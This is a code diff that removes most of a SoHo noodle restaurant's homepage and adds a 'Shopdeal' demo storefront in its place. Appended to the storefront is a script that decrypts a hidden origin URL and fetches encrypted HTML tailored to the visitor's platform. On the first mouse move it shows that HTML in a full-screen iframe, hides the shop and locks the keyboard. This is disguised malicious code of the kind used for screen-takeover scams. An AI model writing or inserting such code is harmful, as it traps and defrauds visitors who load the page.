-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/communal_noodle_dinner_banquet.jpg" alt="Communal dinner table celebrating noodle banquet">
-            </div>
-            <div class="card-body">
-              <h3 class="card-title">The Mercer Chambers</h3>
-              <p class="card-desc">A reservable private dining room accommodating up to twelve guests for bespoke evening dinners, customized noodle flights, and curated botanical pairings.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 7: Ceramic Bowl Craft & Table Setting Artistry -->
-    <section class="section section-alt">
-      <div class="container">
-        <div class="feature-split">
-          <div class="feature-media">
-            <img src="assets/images/handcrafted_ceramic_noodle_bowl_setting.jpg" alt="Handcrafted stoneware noodle bowls and place setting" width="560" height="420">
-          </div>
-          <div class="feature-content">
-            <span class="section-tag">Tactile Design</span>
-            <h3>Ceramic Thermodynamics &amp; Bowl Architecture</h3>
-            <p>A great dinner noodle deserves an equally considered vessel. All NoodleTable bowls are custom wood-fired in small artisan kilns with thick iron-rich stoneware walls that retain thermal heat up to twenty minutes after plating.</p>
-            <ul class="feature-list">
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Steep Conical Slope:</strong> Concentrates thermal heat at the bowl base while focusing delicate broth aromatics upward toward the diner.</span>
-              </li>
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Natural Ash Glazes:</strong> Unique textural finishes providing a firm, tactile grip when lifting the bowl to sip the final drops of broth.</span>
-              </li>
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Pre-Warmed Bowls:</strong> Every stoneware bowl is brought to 70°C in dedicated convection warming drawers before receiving broth.</span>
-              </li>
-            </ul>
-            <a href="blog/ceramic-heat-retention-noodle-bowl-thermodynamics.html" class="btn btn-secondary">Read Bowl Thermodynamics Study</a>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 8: Artisanal Botanical Tea & Elixir Pairings -->
-    <section class="section" id="botanicals">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Nocturnal Elixirs</span>
-          <h2 class="section-title">Harmonious Botanical &amp; Tea Pairings</h2>
-          <p class="section-subtitle">We deliberately curate alcohol-free evening pairings featuring cold-brewed heirloom teas, smoked mountain botanicals, and citrus elixirs designed to complement broth lipid profiles.</p>
-        </div>
-        <div class="cards-grid-3">
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/housemade_botanical_tea_infusion.jpg" alt="Chilled botanical citrus tea in crystal glassware">
-            </div>
-            <div class="card-body">
-              <span class="card-origin">Kyoto Roasted Grain</span>
-              <h3 class="card-title">Mugicha Roasted Barley Cold Brew</h3>
-              <p class="card-desc">Deeply toasty and nutty roasted barley steeped in cold spring water for sixteen hours, cutting cleanly through rich pork and beef bone broths.</p>
-            </div>
-          </div>
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/pan_seared_shiitake_noodle_pairing.jpg" alt="Wild shiitake and botanical aromatic infusions">
-            </div>
-            <div class="card-body">
-              <span class="card-origin">Wuyi Mountain Reserve</span>
-              <h3 class="card-title">Smoked Lapsang Pine Needle Brew</h3>
-              <p class="card-desc">Heirloom black tea withered over pine hearth embers, delivering subtle campfire aromatics that elevate braised beef shank and fermented chili crisp.</p>
-            </div>
-          </div>
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/seasonal_greens_dinner_garnish.jpg" alt="Sparkling botanical elixir with yuzu and fresh garden mint">
-            </div>
-            <div class="card-body">
-              <span class="card-origin">Kochi Citrus Harvest</span>
-              <h3 class="card-title">Sparkling Yuzu Blossom Elixir</h3>
-              <p class="card-desc">Cold-pressed aromatic yuzu juice lightly carbonated with mountain mineral water and fresh wild mint, offering bright acidity between noodle courses.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 9: Seasonal Dinner Sides & Small Plates -->
-    <section class="section section-alt">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Small Plates</span>
-          <h2 class="section-title">Companions to the Noodle Table</h2>
-          <p class="section-subtitle">Artisanal accompaniments designed to balance salinity, add textural crunch, and refresh the palate throughout dinner service.</p>
-        </div>
-        <div class="cards-grid-4">
-          <div class="noodle-card">
-            <div class="card-thumb" style="height:180px;">
-              <img src="assets/images/pan_seared_shiitake_noodle_pairing.jpg" alt="Pan seared wild mushrooms">
-            </div>
-            <div class="card-body" style="padding:16px;">
-              <h4 style="font-size:16px; margin-bottom:6px;">Charred Maitake</h4>
-              <p style="font-size:13px; color:var(--color-text-muted);">Tossed in toasted sesame oil and aged black vinegar.</p>
-            </div>
-          </div>
-          <div class="noodle-card">
-            <div class="card-thumb" style="height:180px;">
-              <img src="assets/images/seasonal_greens_dinner_garnish.jpg" alt="Wok charred greens">
-            </div>
-            <div class="card-body" style="padding:16px;">
-              <h4 style="font-size:16px; margin-bottom:6px;">Wok Baby Bok Choy</h4>
-              <p style="font-size:13px; color:var(--color-text-muted);">Crisp tender greens with garlic chili glaze.</p>
-            </div>
-          </div>
-          <div class="noodle-card">
-            <div class="card-thumb" style="height:180px;">
-              <img src="assets/images/stone_milled_flour_dough_craft.jpg" alt="Steamed heritage dough buns">
-            </div>
-            <div class="card-body" style="padding:16px;">
-              <h4 style="font-size:16px; margin-bottom:6px;">Heirloom Steamed Mantou</h4>
-              <p style="font-size:13px; color:var(--color-text-muted);">Pillowy wheat buns for dipping into rich dashi.</p>
-            </div>
-          </div>
-          <div class="noodle-card">
-            <div class="card-thumb" style="height:180px;">
-              <img src="assets/images/wok_tossed_dinner_noodle_station.jpg" alt="House chili crisp condiments">
-            </div>
-            <div class="card-body" style="padding:16px;">
-              <h4 style="font-size:16px; margin-bottom:6px;">Crisp Chili Infusion</h4>
-              <p style="font-size:13px; color:var(--color-text-muted);">Shallots, Sichuan peppercorns, and garlic crisped in oil.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 10: Guest Testimonials & Reviews -->
-    <section class="section">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Dinner Accolades</span>
-          <h2 class="section-title">Echoes from the Mercer Hearth</h2>
-          <p class="section-subtitle">Reflections from culinary critics and dinner guests who have shared an evening at our SoHo noodle atelier.</p>
-        </div>
-        <div class="testimonials-grid">
-          <div class="testimonial-card">
-            <div>
-              <div class="quote-stars">★★★★★</div>
-              <p class="quote-text">"NoodleTable turns what is often a hurried lunch into an extraordinary nocturnal dining ritual. The 18-hour broth has a clarity and depth of umami that lingers long after you leave Mercer Street."</p>
-            </div>
-            <div class="quote-author">
-              <div>
-                <div class="author-name">Jonathan Vance</div>
-                <div class="author-role">Manhattan Dining Gazette</div>
-              </div>
-            </div>
-          </div>
-          <div class="testimonial-card">
-            <div>
-              <div class="quote-stars">★★★★★</div>
-              <p class="quote-text">"Watching the chef hand-pull lamian directly in front of the counter while sipping roasted barley tea is dinner theater of the highest caliber. The chew on these noodles is unrivaled."</p>
-            </div>
-            <div class="quote-author">
-              <div>
-                <div class="author-name">Elena Rostova</div>
-                <div class="author-role">Culinary Science Critic</div>
-              </div>
-            </div>
-          </div>
-          <div class="testimonial-card">
-            <div>
-              <div class="quote-stars">★★★★★</div>
-              <p class="quote-text">"The private Mercer dining chamber provided our gathering with the most intimate culinary evening in New York. Every course felt intentional, warm, and deeply comforting."</p>
-            </div>
-            <div class="quote-author">
-              <div>
-                <div class="author-name">Marcus Sterling</div>
-                <div class="author-role">Dinner Salon Host</div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 11: Dinner Reservation & Atelier Location -->
-    <section class="section section-alt" id="reservations">
-      <div class="container">
-        <div class="feature-split">
-          <div class="feature-content">
-            <span class="section-tag">Join Us For Dinner</span>
-            <h3>Reserve Your Seat at the Table</h3>
-            <p>NoodleTable hosts two distinct evening seatings Wednesday through Sunday: <strong>5:30 PM</strong> and <strong>8:15 PM</strong>. We welcome both individual culinary explorers at our cedar counter and intimate dinner parties in our hearth salon.</p>
-            <div style="background:var(--color-surface); padding:24px; border-radius:6px; border:1px solid var(--color-border); margin-bottom:24px;">
-              <p style="margin-bottom:8px;"><strong>Atelier Location:</strong> 181 Mercer Street, New York, NY 10012, United States</p>
-              <p style="margin-bottom:8px;"><strong>Concierge Telephone:</strong> <a href="tel:+18887775845" style="color:var(--color-accent); font-weight:bold;">+1-888-777-5845</a></p>
-              <p style="margin-bottom:0; font-size:13px; color:var(--color-text-muted);">Dietary Accommodations: Dedicated vegan dashi and buckwheat noodle courses available upon advance notice.</p>
-            </div>
-            <a href="contact.html" class="btn btn-primary">Book Seating Online</a>
-          </div>
-          <div class="feature-media">
-            <img src="assets/images/mercer_street_noodle_atelier_exterior.jpg" alt="Exterior facade of NoodleTable at 181 Mercer Street" width="560" height="420">
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 12: Frequently Asked Questions -->
-    <section class="section">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Service Inquiries</span>
-          <h2 class="section-title">Frequently Asked Questions</h2>
-          <p class="section-subtitle">Everything you need to know about dining, seating reservations, and our culinary practices at NoodleTable.</p>
-        </div>
-        <div class="faq-grid">
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>What is the duration of an evening dinner service?</span>
-              <span class="faq-toggle-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              <p>Our multi-course dinner service is designed to be savored over 90 to 105 minutes. We encourage guests to arrive ten minutes prior to their seated reservation time to settle in and enjoy a welcoming cup of hot roasted barley tea.</p>
-            </div>
-          </div>
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>Can dietary preferences or restrictions be accommodated?</span>
-              <span class="faq-toggle-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              <p>Yes. We offer an entirely plant-based dinner tasting course featuring our slow-simmered roasted mushroom and kombu dashi. Please notify our team when booking your reservation so our kitchen can prepare fresh dough batches accordingly.</p>
-            </div>
-          </div>
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>Where is NoodleTable located and how can I reach the concierge?</span>
-              <span class="faq-toggle-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              <p>Our atelier is situated at 181 Mercer Street, New York, NY 10012, in the heart of SoHo. For reservations, private room bookings, or special dietary inquiries, you may phone our direct concierge desk at +1-888-777-5845.</p>
-            </div>
-          </div>
-          <div class="faq-item">
-            <button class="faq-question">
-              <span>Are walk-in guests accepted for evening dinner?</span>
-              <span class="faq-toggle-icon">+</span>
-            </button>
-            <div class="faq-answer">
-              <p>We reserve a limited number of counter seats for walk-in guests at the opening of each seating (5:30 PM and 8:15 PM). However, due to high demand and dough preparation limits, advance reservations are strongly recommended.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-brand">
-          <h3>NoodleTable</h3>
-          <p>Elevating the nocturnal noodle ritual through artisanal wheat mechanics, alkaline dough physics, and slow 18-hour broth extractions in SoHo Manhattan.</p>
-          <div class="contact-item">
-            <span>📍</span>
-            <span>181 Mercer Street, New York, NY 10012, United States</span>
-          </div>
-          <div class="contact-item">
-            <span>📞</span>
-            <a href="tel:+18887775845" style="color:#A9A29A;">+1-888-777-5845</a>
-          </div>
-        </div>
-        <div>
-          <h4 class="footer-title">Dinner Service</h4>
-          <ul class="footer-links">
-            <li><a href="index.php#tasting-menu">Omakase Noodle Flights</a></li>
-            <li><a href="index.php#calculator">Hydration Calculator</a></li>
-            <li><a href="index.php#broth-lab">18-Hour Broth Extraction</a></li>
-            <li><a href="index.php#botanicals">Artisanal Tea Pairings</a></li>
-            <li><a href="contact.html">Dinner Seatings</a></li>
-          </ul>
-        </div>
-        <div>
-          <h4 class="footer-title">The Atelier</h4>
-          <ul class="footer-links">
-            <li><a href="about.html">Culinary Philosophy</a></li>
-            <li><a href="about.html#grains">Stone-Milled Grains</a></li>
-            <li><a href="about.html#ceramics">Handmade Tableware</a></li>
-            <li><a href="blog.html">Technical Treatises</a></li>
-            <li><a href="contact.html">Private Dining Salon</a></li>
-          </ul>
-        </div>
-        <div>
-          <h4 class="footer-title">Evening Treatises</h4>
-          <ul class="footer-links">
-            <li><a href="blog/alkaline-dough-chemistry-kansui-noodle-elasticity.html">Alkaline Dough Chemistry</a></li>
-            <li><a href="blog/dashi-extraction-physics-kombu-bonito-umami.html">Dashi Extraction Physics</a></li>
-            <li><a href="blog/hand-pulled-lamian-gluten-alignment-techniques.html">Hand-Pulled Lamian Mechanics</a></li>
-            <li><a href="blog/sanuki-udon-water-salinity-kneading-dynamics.html">Sanuki Udon Salinity</a></li>
-            <li><a href="blog/szechuan-chili-crisp-lipid-infusion-science.html">Chili Lipid Extraction</a></li>
-          </ul>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 NoodleTable Atelier. All Rights Reserved. 181 Mercer Street, New York, NY 10012.</p>
-        <div class="footer-legal-links">
-          <a href="privacy-policy.html">Privacy Policy</a>
-          <a href="terms-and-conditions.html">Terms &amp; Conditions</a>
-          <a href="disclaimer.html">Disclaimer</a>
-          <a href="cookie-policy.html">Cookie Policy</a>
-        </div>
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </footer>
+
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
